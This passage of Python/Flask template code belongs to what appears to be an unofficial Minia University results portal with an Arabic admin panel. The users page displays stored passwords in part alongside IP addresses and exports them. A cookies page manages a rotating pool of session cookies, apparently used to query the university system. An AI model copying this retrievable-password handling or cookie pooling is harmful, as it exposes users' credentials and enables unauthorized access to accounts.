    box-shadow:0 14px 35px rgba(212,175,55,.45);
}

/* Error */
.error{
    background:rgba(220,38,38,.25);
    color:#ffdcdc;
    padding:22px;
    border-radius:16px;
    text-align:center;
    font-size:16px;
}

/* Footer */
.footer{
    text-align:center;
    margin-top:18px;
    font-size:13px;
}

.footer a{
    color:#d4af37;
    text-decoration:none;
}

.footer a:hover{
    text-decoration:underline;
}

/* Small screens */
@media(max-width:400px){
    .info-label{
        min-width:100%;
        margin-bottom:6px;
    }
    .stat{
        font-size:16px;
        gap:12px;
        padding:16px 20px;
    }
}
</style>
</head>

<body>

<div class="result-box">

    <div class="header">
    <img src="https://www.minia.edu.eg/minia/images/newlogo2026.png" alt="Minia University Logo">
    <h2 style="font-family:'Cinzel', serif; color:#d4af37; font-size:clamp(22px,5vw,28px); letter-spacing:1px; margin-bottom:6px;">
        Minia University
    </h2>
    <p style="font-family:'Poppins', sans-serif; color:#cfd9ff; font-size:clamp(14px,3vw,16px);">
        Academic Results Portal
    </p>
</div>

    {% if error %}
        <div class="error">
            ❌ {{ error }} <br><br>
            <a href="/" class="btn">عودة</a>
        </div>

    {% elif data and data.data %}
        {% set first = data.data[0] %}

        <div class="info">
            <div class="info-row">
                <div class="info-label">👤 اسم الطالب</div>
                <div class="info-value">{{ first.StuName or 'غير متوفر' }}</div>
            </div>

            <div class="info-row">
                <div class="info-label">🆔 رقم الطالب</div>
                <div class="info-value">{{ first.studentID or first.Code or 'غير متوفر' }}</div>
            </div>

            <div class="info-row">
                <div class="info-label">🏫 الكلية</div>
                <div class="info-value">{{ (first.faculty or 'غير متوفر').replace('|',' - ') }}</div>
            </div>

            <div class="info-row">
                <div class="info-label">🎓 المستوى</div>
                <div class="info-value">{{ (first.lvl or 'غير متوفر').replace('|',' - ') }}</div>
            </div>

            <div class="info-row">
                <div class="info-label">📚 البرنامج</div>
                <div class="info-value">{{ (first.prog or 'غير متوفر').replace('|',' - ') }}</div>
            </div>
        </div>

        <div class="stats">
            <div class="stat">
                <div class="icon"></div>
                <span>المعدل التراكمي: {{ first.stuGPA or '0.00' }}</span>
                <div class="icon"></div>
                <span>الساعات المكتسبة: {{ first.stuEarnedHours or '0' }}</span>
            </div>
        </div>

        <div class="actions">
            <a href="/" class="btn">استعلام جديد</a>
        </div>

    {% else %}
        <div class="error">
            ❌ لا توجد بيانات متاحة <br><br>
            <a href="/" class="btn">عودة</a>
        </div>
    {% endif %}

    <div class="footer">
        <a href="{{ dev_link }}" target="_blank">{{ dev_name }}</a>
    </div>

</div>

</body>
</html>
'''

ADMIN_PAGE = '''
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة الأدمن - جامعة المنيا</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 15px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .header h1 { color: #667eea; }
        .logout-btn { 
            background: #dc3545; 
            color: white; 
            padding: 8px 16px; 
            border-radius: 8px; 
            text-decoration: none;
            transition: 0.3s;
        }
        .logout-btn:hover { background: #c82333; }
        .menu-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
            gap: 20px; 
        }
        .menu-card { 
            background: white; 
            border-radius: 15px; 
            padding: 30px; 
            text-align: center; 
            text-decoration: none; 
            color: #333; 
            transition: 0.3s; 
            display: block;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .menu-card:hover { 
            transform: translateY(-5px); 
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.3);
        }
        .menu-icon { font-size: 48px; margin-bottom: 15px; }
        .menu-card h3 { margin-bottom: 10px; color: #667eea; }
        .menu-card p { color: #666; font-size: 14px; }
        .dev-footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.8);
        }
        .dev-footer a {
            color: white;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔧 لوحة تحكم الأدمن</h1>
            <a href="/logout" class="logout-btn">🚪 تسجيل خروج</a>
        </div>
        
        <div class="menu-grid">
            <a href="/admin/settings" class="menu-card">
                <div class="menu-icon">⚙️</div>
                <h3>الإعدادات</h3>
                <p>تخصيص إعدادات النظام</p>
            </a>
            
            <a href="/admin/users" class="menu-card">
                <div class="menu-icon">👥</div>
                <h3>المستخدمين</h3>
                <p>إدارة المستخدمين والمحظورين</p>
            </a>
            
            <a href="/admin/banned_codes" class="menu-card">
                <div class="menu-icon">🚫</div>
                <h3>أكواد محظورة</h3>
                <p>إدارة أكواد الطلاب المحظورة</p>
            </a>
            
            <a href="/admin/cookies" class="menu-card">
                <div class="menu-icon">🍪</div>
                <h3>الكوكيز</h3>
                <p>إضافة وإدارة الكوكيز</p>
            </a>
            
            <a href="/admin/access_codes" class="menu-card">
                <div class="menu-icon">🔑</div>
                <h3>أكواد الوصول</h3>
                <p>إدارة أكواد الوصول</p>
            </a>
            
            <a href="/admin/export_users" class="menu-card">
                <div class="menu-icon">📥</div>
                <h3>تصدير البيانات</h3>
                <p>تصدير بيانات المستخدمين (JSON/CSV)</p>
            </a>
            
            <a href="/" class="menu-card">
                <div class="menu-icon">🏠</div>
                <h3>الصفحة الرئيسية</h3>
                <p>العودة لصفحة الاستعلام</p>
            </a>
        </div>
        
        <div class="dev-footer">
            <a href="{{ dev_link }}" target="_blank">👨‍💻 {{ dev_name }}</a>
        </div>
    </div>
</body>
</html>
'''

SETTINGS_PAGE = '''
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الإعدادات - جامعة المنيا</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 15px; }
        .container { max-width: 600px; margin: 0 auto; }
        .header { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
        }
        .header h1 { color: #667eea; }
        .back-btn { 
            background: #6c757d; 
            color: white; 
            padding: 8px 16px; 
            border-radius: 8px; 
            text-decoration: none;
        }
        .card { 
            background: white; 
            border-radius: 15px; 
            padding: 25px; 
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .setting-item { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            padding: 15px 0; 
            border-bottom: 1px solid #eee; 
        }
        .setting-item:last-child { border-bottom: none; }
        .setting-info h3 { color: #333; margin-bottom: 5px; }
        .setting-info p { color: #666; font-size: 14px; }
        .toggle-switch { position: relative; width: 60px; height: 34px; }
        .toggle-switch input { opacity: 0; width: 0; height: 0; }
        .slider { 
            position: absolute; 
            cursor: pointer; 
            top: 0; 
            left: 0; 
            right: 0; 
            bottom: 0; 
            background-color: #ccc; 
            transition: .4s; 
            border-radius: 34px; 
        }
        .slider:before { 
            position: absolute; 
            content: ""; 
            height: 26px; 
            width: 26px; 
            left: 4px; 
            bottom: 4px; 
            background-color: white; 
            transition: .4s; 
            border-radius: 50%; 
        }
        input:checked + .slider { background-color: #667eea; }
        input:checked + .slider:before { transform: translateX(26px); }
        .number-input {
            width: 80px;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 5px;
            text-align: center;
        }
        .save-btn { 
            background: #28a745; 
            color: white; 
            border: none; 
            padding: 12px; 
            border-radius: 8px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
            width: 100%; 
            margin-top: 20px; 
        }
        .save-btn:hover { background: #218838; }
        .dev-footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.8);
        }
        .dev-footer a {
            color: white;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚙️ الإعدادات</h1>
            <a href="/admin" class="back-btn">رجوع</a>
        </div>
        
        <div class="card">
            <form method="POST">
                <div class="setting-item">
                    <div class="setting-info">
                        <h3>كود واحد لكل مستخدم</h3>
                        <p>منع المستخدمين من استخدام أكثر من كود طالب</p>
                    </div>
                    <label class="toggle-switch">
                        <input type="checkbox" name="single_code" {% if settings.single_code_per_user %}checked{% endif %}>
                        <span class="slider"></span>
                    </label>
                </div>
                
                <div class="setting-item">
                    <div class="setting-info">
                        <h3>إلزام الاشتراك</h3>
                        <p>تطلب اشتراك القناة لاستخدام النظام</p>
                    </div>
                    <label class="toggle-switch">
                        <input type="checkbox" name="subscription" {% if settings.subscription_required %}checked{% endif %}>
                        <span class="slider"></span>
                    </label>
                </div>
                
                <div class="setting-item">
                    <div class="setting-info">
                        <h3>وضع الصيانة</h3>
                        <p>تعطيل جميع الخدمات مؤقتاً</p>
                    </div>
                    <label class="toggle-switch">
                        <input type="checkbox" name="maintenance" {% if settings.maintenance_mode %}checked{% endif %}>
                        <span class="slider"></span>
                    </label>
                </div>
                
                <div class="setting-item">
                    <div class="setting-info">
                        <h3>تدوير الكوكيز</h3>
                        <p>اختيار أفضل كوكيز متاحة تلقائياً</p>
                    </div>
                    <label class="toggle-switch">
                        <input type="checkbox" name="cookie_rotation" {% if settings.cookie_rotation %}checked{% endif %}>
                        <span class="slider"></span>
                    </label>
                </div>
                
                <div class="setting-item">
                    <div class="setting-info">
                        <h3>الحد الأقصى لاستخدام الكوكيز</h3>
                        <p>عدد مرات استخدام كل كوكيز قبل إيقافها</p>
                    </div>
                    <input type="number" name="max_cookie_uses" class="number-input" value="{{ settings.max_cookie_uses or 50 }}" min="1" max="1000">
                </div>
                
                <button type="submit" class="save-btn">💾 حفظ الإعدادات</button>
            </form>
        </div>
        
        <div class="dev-footer">
            <a href="{{ dev_link }}" target="_blank">👨‍💻 {{ dev_name }}</a>
        </div>
    </div>
</body>
</html>
'''

USERS_PAGE = '''
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدارة المستخدمين - جامعة المنيا</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 15px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
        }
        .header h1 { color: #667eea; }
        .header-buttons {
            display: flex;
            gap: 10px;
        }
        .back-btn { 
            background: #6c757d; 
            color: white; 
            padding: 8px 16px; 
            border-radius: 8px; 
            text-decoration: none;
        }
        .export-btn {
            background: #28a745;
            color: white;
            padding: 8px 16px;
            border-radius: 8px;
            text-decoration: none;
        }
        .card { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .card h2 { color: #667eea; margin-bottom: 15px; }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            font-size: 14px;
        }
        th { 
            background: #667eea; 
            color: white; 
            padding: 12px; 
            text-align: center; 
        }
        td { 
            padding: 10px; 
            border-bottom: 1px solid #dee2e6; 
            text-align: center; 
        }
        tr:hover { background-color: #f5f5f5; }
        .btn-success { 
            background: #28a745; 
            color: white; 
            border: none; 
            padding: 5px 10px; 
            border-radius: 3px; 
            cursor: pointer; 
            text-decoration: none;
            font-size: 12px;
        }
        .btn-danger { 
            background: #dc3545; 
            color: white; 
            border: none; 
            padding: 5px 10px; 
            border-radius: 3px; 
            cursor: pointer; 
            text-decoration: none;
            font-size: 12px;
        }
        .btn-info { 
            background: #17a2b8; 
            color: white; 
            border: none; 
            padding: 5px 10px; 
            border-radius: 3px; 
            cursor: pointer; 
            text-decoration: none;
            font-size: 12px;
        }
        .input-group { 
            display: flex; 
            gap: 10px; 
            margin-bottom: 20px; 
        }
        .input-group input { 
            flex: 1; 
            padding: 10px; 
            border: 1px solid #ddd; 
            border-radius: 5px; 
        }
        .password-mask {
            font-family: monospace;
            background: #f0f0f0;
            padding: 2px 5px;
            border-radius: 3px;
        }
        .ip-address {
            font-family: monospace;
            color: #17a2b8;
        }
        .search-box {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .export-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        .dev-footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.8);
        }
        .dev-footer a {
            color: white;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>👥 إدارة المستخدمين</h1>
            <div class="header-buttons">
                <a href="/admin/export_users" class="export-btn" target="_blank">📥 تصدير JSON</a>
                <a href="/admin/export_users_csv" class="export-btn" target="_blank">📥 تصدير CSV</a>
                <a href="/admin" class="back-btn">رجوع</a>
            </div>
        </div>
        
        <div class="card">
            <h2>➕ إضافة إلى قائمة البيض</h2>
            <form method="POST" action="/admin/whitelist" class="input-group">
                <input type="hidden" name="action" value="add">
                <input type="text" name="user_id" placeholder="معرف المستخدم" required>
                <button type="submit" class="btn-success">إضافة</button>
            </form>
            
            <h2>📋 قائمة البيض</h2>
            <table>
                <thead>
                    <tr><th>معرف المستخدم</th><th>إجراء</th></tr>
                </thead>
                <tbody>
                    {% for user in whitelist %}
                    <tr>
                        <td>{{ user }}</td>
                        <td>
                            <form method="POST" action="/admin/whitelist" style="display:inline;">
                                <input type="hidden" name="action" value="remove">
                                <input type="hidden" name="user_id" value="{{ user }}">
                                <button type="submit" class="btn-danger">حذف</button>
                            </form>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        
        <div class="card">
            <h2>🚫 المستخدمين المحظورين</h2>
            <table>
                <thead>
                    <tr><th>معرف المستخدم</th><th>إجراء</th></tr>
                </thead>
                <tbody>
                    {% for user in banned_users %}
                    <tr>
                        <td>{{ user }}</td>
                        <td>
                            <form method="POST" action="/admin/unban" style="display:inline;">
                                <input type="hidden" name="user_id" value="{{ user }}">
                                <button type="submit" class="btn-success">رفع الحظر</button>
                            </form>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        
        <div class="card">
            <h2>📊 المستخدمين المسجلين (مع كلمات المرور وعناوين IP)</h2>
            
            <input type="text" id="searchInput" class="search-box" placeholder="🔍 بحث في المستخدمين (بالكود، الباسورد، أو IP)..." onkeyup="searchTable()">
            
            <div class="export-buttons">
                <span style="color: #667eea;">إجمالي المستخدمين: {{ student_codes|length }}</span>
            </div>
            
            <table id="usersTable">
                <thead>
                    <tr>
                        <th>معرف المستخدم</th>
                        <th>كود الطالب</th>
                        <th>كلمة المرور</th>
                        <th>آخر IP</th>
                        <th>آخر ظهور</th>
                        <th>الإجراءات</th>
                    </tr>
                </thead>
                <tbody>
                    {% for user, data in student_codes.items() %}
                    {% if user != 'admin' %}
                    <tr>
                        <td>{{ user }}</td>
                        <td>{{ data.student_code if data.student_code else '—' }}</td>
                        <td><span class="password-mask">●●●●●●</span> {{ data.password[:4] if data.password else '' }}...</td>
                        <td class="ip-address">{{ data.last_ip if data.last_ip else '—' }}</td>
                        <td>{{ data.last_seen[:16] if data.last_seen else '—' }}</td>
                        <td>
                            <a href="/admin/user_details/{{ user }}" class="btn-info" target="_blank">عرض التفاصيل</a>
                        </td>
                    </tr>
                    {% endif %}
                    {% endfor %}
                </tbody>
            </table>
        </div>
        
        <div class="dev-footer">
            <a href="{{ dev_link }}" target="_blank">👨‍💻 {{ dev_name }}</a>
        </div>
    </div>
    
    <script>
    function searchTable() {
        var input, filter, table, tr, td, i, j, txtValue;
        input = document.getElementById("searchInput");
        filter = input.value.toUpperCase();
        table = document.getElementById("usersTable");
        tr = table.getElementsByTagName("tr");
        
        for (i = 1; i < tr.length; i++) {
            tr[i].style.display = "none";
            td = tr[i].getElementsByTagName("td");
            for (j = 0; j < td.length; j++) {
                if (td[j]) {
                    txtValue = td[j].textContent || td[j].innerText;
                    if (txtValue.toUpperCase().indexOf(filter) > -1) {
                        tr[i].style.display = "";
                        break;
                    }
                }
            }
        }
    }
    </script>
</body>
</html>
'''

BANNED_CODES_PAGE = '''
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أكواد الطلاب المحظورة - جامعة المنيا</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 15px; }
        .container { max-width: 800px; margin: 0 auto; }
        .header { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
        }
        .header h1 { color: #667eea; }
        .back-btn { 
            background: #6c757d; 
            color: white; 
            padding: 8px 16px; 
            border-radius: 8px; 
            text-decoration: none;
        }
        .card { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .card h2 { color: #667eea; margin-bottom: 15px; }
        .input-group { 
            display: flex; 
            gap: 10px; 
            margin-bottom: 20px; 
        }
        .input-group input { 
            flex: 1; 
            padding: 10px; 
            border: 1px solid #ddd; 
            border-radius: 5px; 
        }
        .btn-danger { 
            background: #dc3545; 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            border-radius: 5px; 
            cursor: pointer; 
        }
        .btn-success { 
            background: #28a745; 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            border-radius: 5px; 
            cursor: pointer; 
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
        }
        th { 
            background: #667eea; 
            color: white; 
            padding: 12px; 
        }
        td { 
            padding: 10px; 
            border-bottom: 1px solid #dee2e6; 
            text-align: center; 
        }
        .dev-footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.8);
        }
        .dev-footer a {
            color: white;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚫 أكواد الطلاب المحظورة</h1>
            <a href="/admin" class="back-btn">رجوع</a>
        </div>
        
        <div class="card">
            <h2>➕ إضافة كود محظور</h2>
            <form method="POST" class="input-group">
                <input type="hidden" name="action" value="add">
                <input type="text" name="code" placeholder="أدخل كود الطالب" required>
                <button type="submit" class="btn-danger">إضافة</button>
            </form>
        </div>
        
        <div class="card">
            <h2>📋 الأكواد المحظورة</h2>
            <table>
                <thead>
                    <tr>
                        <th>كود الطالب</th>
                        <th>إجراء</th>
                    </tr>
                </thead>
                <tbody>
                    {% for code in banned_codes %}
                    <tr>
                        <td>{{ code }}</td>
                        <td>
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="action" value="remove">
                                <input type="hidden" name="code" value="{{ code }}">
                                <button type="submit" class="btn-success">إزالة</button>
                            </form>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        
        <div class="dev-footer">
            <a href="{{ dev_link }}" target="_blank">👨‍💻 {{ dev_name }}</a>
        </div>
    </div>
</body>
</html>
'''

COOKIES_PAGE = '''
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدارة الكوكيز - جامعة المنيا</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 15px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
        }
        .header h1 { color: #667eea; }
        .back-btn { 
            background: #6c757d; 
            color: white; 
            padding: 8px 16px; 
            border-radius: 8px; 
            text-decoration: none;
        }
        .card { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .card h2 { color: #667eea; margin-bottom: 15px; }
        .input-group { 
            display: flex; 
            flex-direction: column;
            gap: 10px; 
            margin-bottom: 20px; 
        }
        .input-group input, .input-group textarea { 
            width: 100%;
            padding: 10px; 
            border: 1px solid #ddd; 
            border-radius: 5px; 
        }
        .input-group textarea {
            min-height: 80px;
            resize: vertical;
        }
        .btn-primary { 
            background: #667eea; 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            border-radius: 5px; 
            cursor: pointer; 
            width: fit-content;
        }
        .btn-success { 
            background: #28a745; 
            color: white; 
            border: none; 
            padding: 5px 10px; 
            border-radius: 3px; 
            cursor: pointer; 
            font-size: 12px;
        }
        .btn-danger { 
            background: #dc3545; 
            color: white; 
            border: none; 
            padding: 5px 10px; 
            border-radius: 3px; 
            cursor: pointer; 
            font-size: 12px;
        }
        .btn-warning { 
            background: #ffc107; 
            color: #333; 
            border: none; 
            padding: 5px 10px; 
            border-radius: 3px; 
            cursor: pointer; 
            font-size: 12px;
        }
        .btn-info { 
            background: #17a2b8; 
            color: white; 
            border: none; 
            padding: 5px 10px; 
            border-radius: 3px; 
            cursor: pointer; 
            font-size: 12px;
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            font-size: 13px;
        }
        th { 
            background: #667eea; 
            color: white; 
            padding: 10px; 
        }
        td { 
            padding: 8px; 
            border-bottom: 1px solid #dee2e6; 
            text-align: center; 
        }
        .active { color: #28a745; font-weight: bold; }
        .inactive { color: #dc3545; font-weight: bold; }
        .valid { color: #28a745; }
        .invalid { color: #dc3545; }
        .cookie-value {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .dev-footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.8);
        }
        .dev-footer a {
            color: white;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🍪 إدارة الكوكيز</h1>
            <a href="/admin" class="back-btn">رجوع</a>
        </div>
        
        <div class="card">
            <h2>➕ إضافة كوكيز جديدة</h2>
            <form method="POST" class="input-group">
                <input type="hidden" name="action" value="add">
                <textarea name="cookie_value" placeholder="أدخل قيمة الكوكيز كاملة مثال: userID=12345; أخرى=value" required></textarea>
                <input type="text" name="description" placeholder="وصف (اختياري)">
                <button type="submit" class="btn-primary">إضافة</button>
            </form>
        </div>
        
        <div class="card">
            <h2>📋 قائمة الكوكيز</h2>
            <table>
                <thead>
                    <tr>
                        <th>الوصف</th>
                        <th>userID</th>
                        <th>القيمة (مختصرة)</th>
                        <th>الحالة</th>
                        <th>الصحة</th>
                        <th>الاستخدام</th>
                        <th>الأخطاء</th>
                        <th>الإجراءات</th>
                    </tr>
                </thead>
                <tbody>
                    {% for id, data in cookies.items() %}
                    <tr>
                        <td>{{ data.description or '—' }}</td>
                        <td><small>{{ data.user_id or '—' }}</small></td>
                        <td class="cookie-value" title="{{ data.value }}">{{ data.value[:30] }}...</td>
                        <td class="{{ 'active' if data.is_active else 'inactive' }}">
                            {{ 'نشط' if data.is_active else 'غير نشط' }}
                        </td>
                        <td class="{{ 'valid' if data.is_valid else 'invalid' }}">
                            {{ 'صالح' if data.is_valid else 'غير صالح' }}
                        </td>
                        <td>{{ data.usage_count or 0 }}</td>
                        <td>{{ data.error_count or 0 }}</td>
                        <td>
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="action" value="toggle">
                                <input type="hidden" name="cookie_id" value="{{ id }}">
                                <button type="submit" class="btn-warning">تفعيل/تعطيل</button>
                            </form>
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="action" value="validate">
                                <input type="hidden" name="cookie_id" value="{{ id }}">
                                <button type="submit" class="btn-info">تحقق</button>
                            </form>
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="action" value="reset_errors">
                                <input type="hidden" name="cookie_id" value="{{ id }}">
                                <button type="submit" class="btn-success">إعادة تعيين</button>
                            </form>
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="cookie_id" value="{{ id }}">
                                <button type="submit" class="btn-danger" onclick="return confirm('هل أنت متأكد؟')">حذف</button>
                            </form>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        
        <div class="dev-footer">
            <a href="{{ dev_link }}" target="_blank">👨‍💻 {{ dev_name }}</a>
        </div>
    </div>
</body>
</html>
'''

ACCESS_CODES_PAGE = '''
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أكواد الوصول - جامعة المنيا</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 15px; }
        .container { max-width: 800px; margin: 0 auto; }
        .header { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
        }
        .header h1 { color: #667eea; }
        .back-btn { 
            background: #6c757d; 
            color: white; 
            padding: 8px 16px; 
            border-radius: 8px; 
            text-decoration: none;
        }
        .card { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .card h2 { color: #667eea; margin-bottom: 15px; }
        .input-group { 
            display: flex; 
            gap: 10px; 
            margin-bottom: 20px; 
        }
        .input-group input { 
            flex: 1; 
            padding: 10px; 
            border: 1px solid #ddd; 
            border-radius: 5px; 
        }
        .input-group select { 
            padding: 10px; 
            border: 1px solid #ddd; 
            border-radius: 5px; 
        }
        .btn-primary { 
            background: #667eea; 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            border-radius: 5px; 
            cursor: pointer; 
        }
        .btn-primary:hover { background: #764ba2; }
        table { 
            width: 100%; 
            border-collapse: collapse; 
        }
        th { 
            background: #667eea; 
            color: white; 
            padding: 10px; 
        }
        td { 
            padding: 10px; 
            border-bottom: 1px solid #dee2e6; 
            text-align: center; 
        }
        .used { color: #dc3545; }
        .available { color: #28a745; }
        .dev-footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.8);
        }
        .dev-footer a {
            color: white;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔑 أكواد الوصول</h1>
            <a href="/admin" class="back-btn">رجوع</a>
        </div>
        
        <div class="card">
            <h2>➕ إضافة كود جديد</h2>
            <form method="POST" class="input-group">
                <input type="text" name="code" placeholder="أدخل الكود" required>
                <select name="type">
                    <option value="single_use">مرة واحدة</option>
                    <option value="permanent">دائم</option>
                </select>
                <button type="submit" class="btn-primary">إضافة</button>
            </form>
        </div>
        
        <div class="card">
            <h2>📋 الأكواد الحالية</h2>
            <table>
                <thead>
                    <tr>
                        <th>الكود</th>
                        <th>النوع</th>
                        <th>الحالة</th>
                        <th>تاريخ الإنشاء</th>
                        <th>المستخدم</th>
                        <th>IP المستخدم</th>
                    </tr>
                </thead>
                <tbody>
                    {% for code, data in codes.items() %}
                    <tr>
                        <td>{{ code }}</td>
                        <td>{{ 'مرة واحدة' if data.single_use else 'دائم' }}</td>
                        <td class="{{ 'used' if data.used else 'available' }}">
                            {{ 'مستخدم' if data.used else 'متاح' }}
                        </td>
                        <td>{{ data.created_at[:10] if data.created_at else '—' }}</td>
                        <td>{{ data.used_by if data.used_by else '—' }}</td>
                        <td>{{ data.used_ip if data.used_ip else '—' }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        
        <div class="dev-footer">
            <a href="{{ dev_link }}" target="_blank">👨‍💻 {{ dev_name }}</a>
        </div>
    </div>
</body>
</html>
'''

USER_DETAILS_PAGE = '''
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفاصيل المستخدم - جامعة المنيا</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 15px; }
        .container { max-width: 800px; margin: 0 auto; }
        .header { 
            background: white; 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
        }
        .header h1 { color: #667eea; }
        .back-btn { 
            background: #6c757d; 
            color: white; 
            padding: 8px 16px; 
            border-radius: 8px; 
            text-decoration: none;
        }
        .card { 
            background: white; 
            border-radius: 15px; 
            padding: 30px; 
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .info-row {
            display: flex;
            padding: 15px 0;
